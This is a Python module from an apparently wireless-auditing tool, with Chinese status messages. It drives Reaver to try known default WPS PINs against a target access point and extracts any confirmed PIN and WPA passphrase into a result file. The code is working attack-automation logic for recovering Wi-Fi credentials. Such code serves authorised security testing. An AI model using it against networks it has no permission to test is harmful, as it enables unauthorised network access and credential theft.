"""Finite default-PIN validation, isolated from brute-force/native resume state."""
import re
import sys
import time
from pathlib import Path, PurePosixPath
from .command_builder import normalize_bssid, quote_argument
from .models import CaptureCleanupError
from .wps_defaults import QUICK_TARGET_SECONDS, default_pin_candidates
from .wps_models import WpsTargetResult, WpsUpdate
from .wps_observation import analyze
from .wps_results import write_wps_result
from .wps_protocol_evidence import WpsProtocolEvidence
from .wps_timing import WpsCandidateTiming

_REJECTED = re.compile(r"quitting after 1 crack attempts", re.I)
_PIN = re.compile(r"WPS PIN:\s*['\"]?([0-9]{8})(?![0-9])", re.I)
_PSK = re.compile(r"WPA PSK:\s*(.+)", re.I)


def quick_skip(target, options):
    if default_pin_candidates(target.bssid, options):
        return None
    return WpsTargetResult(
        bssid=target.bssid, ssid=target.ssid, mode="second",
        note="未匹配已知默认 PIN 算法，已跳过速测；不代表目标安全或不支持其他 WPS 测试。")


class QuickWpsCapture:
    def __init__(self, process_manager, base_builder):
        self.process_manager = process_manager
        self.base_builder = base_builder

    def run(self, workspace, monitor_interface, session_id, target, options,
            local_output_dir, workspace_manager, index, total_targets,
            cancel_event=None, progress_callback=None, *, diagnostic=None, source_rotation=None):
        candidates = default_pin_candidates(target.bssid, options)
        if not candidates:
            return quick_skip(target, options)
        bssid = normalize_bssid(target.bssid)
        label = str(target.ssid or bssid)
        started = time.monotonic()
        deadline = started + QUICK_TARGET_SECONDS
        evidence = WpsProtocolEvidence()
        rejected = 0
        pin = psk = ""
        ending = "默认 PIN 速测未完成"
        current_pin = status = ""
        timing = WpsCandidateTiming()

        def report(phase):
            if progress_callback is not None:
                candidate_elapsed, average_per_minute = timing.snapshot()
                progress_callback(WpsUpdate(
                    elapsed=min(QUICK_TARGET_SECONDS, int(time.monotonic()-started)),
                    total=QUICK_TARGET_SECONDS, target_label=label,
                    target_index=index, target_total=total_targets, phase=phase,
                    current_pin=current_pin, status=status, target_bssid=bssid,
                    candidate_elapsed=candidate_elapsed, average_per_minute=average_per_minute))

        def check_cancel():
            if cancel_event is not None and cancel_event.is_set():
                raise RuntimeError("WPS 任务已取消。")

        for number, candidate in enumerate(candidates):
            check_cancel()
            if time.monotonic() >= deadline:
                ending = "已到达默认 PIN 速测验证上限，未完成的候选不判定为拒绝"
                break
            phase = f"默认 PIN 速测 {number+1}/{len(candidates)}"
            # A disposable per-candidate session must never import/overwrite normal progress.
            remote_session = str(PurePosixPath(workspace.remote_dir) / f"quick-{index}-{number}.wpc")
            candidate_options = source_rotation.next_options(options, cancel_event) if source_rotation is not None else options
            if source_rotation is not None and diagnostic is not None:
                diagnostic.event("source_rotated", verified=True)
            base = self.base_builder(workspace, monitor_interface, target, "second", candidate_options,
                                     workspace_manager, cancel_event, session_path=remote_session)
            command = f"{base} -p {quote_argument(candidate.pin)}"
            if source_rotation is not None:
                command += " -g 1"
            if source_rotation is not None and time.monotonic() >= deadline:
                break
            check_cancel()
            timing.begin_phase()
            if diagnostic is not None:
                diagnostic.phase(number + 1)
            handle = self.process_manager.start("reaver", command,
                f"{session_id}-quick{index}-{number}", str(workspace.remote_dir), cancel_event,
                max_runtime=QUICK_TARGET_SECONDS+10)
            current_pin = ""
            status = "等待工具开始验证候选"
            was_rejected = False
            terminal = ""

            def consume(text):
                nonlocal current_pin, status, pin, psk, was_rejected, terminal
                evidence.feed(text)
                timing.feed(text)
                if diagnostic is not None:
                    diagnostic.feed(text)
                observation = analyze(text)
                if observation.current_pin: current_pin = observation.current_pin
                if observation.status: status = observation.status
                match = _PIN.search(text)
                if match: pin = match.group(1)
                match = _PSK.search(text)
                if match: psk = match.group(1).strip().strip(" '\"")
                if _REJECTED.search(text): was_rejected = True
                if observation.stage in {"blocked", "tool_error"}:
                    terminal = status
                elif "transaction failed" in text.lower() or "failed to associate" in text.lower():
                    terminal = "目标关联或 WPS 交互未完成，不能判定候选 PIN 是否有效"

            try:
                report(phase)
                while time.monotonic() < deadline:
                    check_cancel()
                    running = self.process_manager.is_running(handle, cancel_event)
                    consume(self.process_manager.read_log_tail(handle, 100, cancel_event))
                    report(phase)
                    if pin or psk or was_rejected or terminal or not running:
                        break
                    if cancel_event is not None: cancel_event.wait(0.5)
                    else: time.sleep(0.5)
                consume(self.process_manager.read_log_tail(handle, 100, None))
                check_cancel()
            finally:
                primary = sys.exc_info()[1]
                try:
                    self.process_manager.stop(handle, None, graceful_signal="INT")
                except Exception as exc:
                    if diagnostic is not None:
                        diagnostic.event("process_stop_failed")
                    note = f"停止默认 PIN 速测进程失败：{exc}"
                    raise CaptureCleanupError(f"{primary}；{note}" if primary else note, (note,)) from exc
                finally:
                    if diagnostic is not None:
                        reason = ("cancelled" if cancel_event is not None and cancel_event.is_set()
                                  else "exception" if primary else "credential_found" if pin or psk
                                  else "rejected" if was_rejected else "interaction_incomplete" if terminal
                                  else "time_budget" if time.monotonic() >= deadline else "native_exit")
                        diagnostic.event("process_stopped", reason=reason)
                        try:
                            diagnostic.feed(self.process_manager.read_log_tail(handle, 100, None), final=True)
                        except Exception:
                            diagnostic.event("final_log_unavailable")
            if pin or psk:
                ending = "默认 PIN 候选已经工具确认"
                break
            if was_rejected:
                rejected += 1
                continue
            ending = terminal or ("已到达默认 PIN 速测验证上限" if time.monotonic() >= deadline
                                  else "Reaver 已退出，未返回确定的候选验证结果")
            break
        if rejected == len(candidates):
            ending = f"{rejected} 个默认 PIN 候选均已确认未通过；不转入常规穷举"
        note = "；".join(filter(None, [ending, status, evidence.describe() if not (pin or psk) else ""]))
        result_file = write_wps_result(local_output_dir, label, bssid, pin, psk)
        timing.freeze()
        report("结束")
        return WpsTargetResult(bssid=bssid, ssid=label, mode="second",
            pin_ok=bool(pin), psk_ok=bool(psk),
            tried_seconds=min(QUICK_TARGET_SECONDS, int(time.monotonic()-started)),
            result_file=result_file, note=note)
